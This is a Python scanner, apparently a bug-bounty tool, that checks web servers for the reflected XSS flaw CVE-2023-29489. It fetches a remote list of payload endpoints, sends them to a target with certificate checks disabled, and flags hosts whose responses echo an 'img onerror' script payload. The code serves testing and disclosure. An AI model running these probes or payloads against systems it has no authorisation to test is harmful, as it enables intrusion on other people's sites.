#!/usr/bin/env python

"""
 * CVE-2023-29489
 * CVE-2023-29489 Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * @Developed By Cappricio Securities <https://cappriciosec.com>
 */
 
"""
from cve.includes import bot
from cve.utils import configure
import requests
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
from cve.includes import writefile
from cve.utils import const
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



def cvescan(url, output):
    try:
        with requests.Session() as session:
            payreq = session.get(const.Data.payloadurl)
            for endpoint in payreq.text.splitlines():
                encode = quote(endpoint)
                fullurl = f'{url}{endpoint}'
                try:
                    response = session.get(
                        fullurl, verify=False, timeout=5)
                    print(f'Checking ===> {fullurl}')
                    if response.status_code == 400:
                        if f'<p>Invalid webcall ID: <img src=x onerror="prompt(document.domain)">cappriciosecurities</p>'  in response.text and 'text/html' in response.headers.get('Content-Type', ''):
                            outputprint = (
                                f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                                f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                                f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n"
                            )
                            print(outputprint)
                            if configure.check_id() == "Exist":
                                bot.sendmessage(fullurl)
                            if output is not None:
                                writefile.writedata(
                                    output, str(f'{fullurl}\n'))
                            break
                except requests.exceptions.RequestException as e:
                    print(
                        f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")
